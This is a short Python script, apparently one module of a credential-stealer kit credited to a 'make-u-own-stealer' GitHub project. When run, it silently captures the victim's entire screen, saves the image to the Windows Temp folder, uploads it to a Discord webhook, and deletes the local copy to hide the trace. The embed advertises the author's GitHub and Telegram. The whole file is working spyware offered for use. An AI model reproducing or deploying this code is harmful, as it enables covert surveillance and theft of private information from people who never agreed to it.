
import os
from discord_webhook import DiscordWebhook, DiscordEmbed
from PIL import ImageGrab

user = os.path.expanduser("~")
hook ="https://discord.com/api/webhooks/"

def screen():
    sss = ImageGrab.grab()
    temp_path = os.path.join(user, "AppData\\Local\\Temp\\ss.png")
    sss.save(temp_path)

    webhook = DiscordWebhook(url=hook)
    embed = DiscordEmbed(title="Screenshot", description="Latest screenshot capture.", color=242424)
    embed.set_author(name="github.com/lawxsz/make-u-own-stealer", icon_url="https://i.imgur.com/NYWdLg6.png")
    embed.set_image(url="https://i.imgur.com/NYWdLg6.png")
    embed.set_footer(text="Follow on Telegram: t.me/lawxsz | GitHub: github.com/lawxsz")
    webhook.add_embed(embed)
    webhook.execute()

    webhook = DiscordWebhook(url=hook)
    with open(temp_path, "rb") as f:
        webhook.add_file(file=f.read(), filename='ss.png')
    webhook.execute()

    try:
        os.remove(temp_path)
    except Exception as e:
        print(f"Error removing file: {e}")

screen()
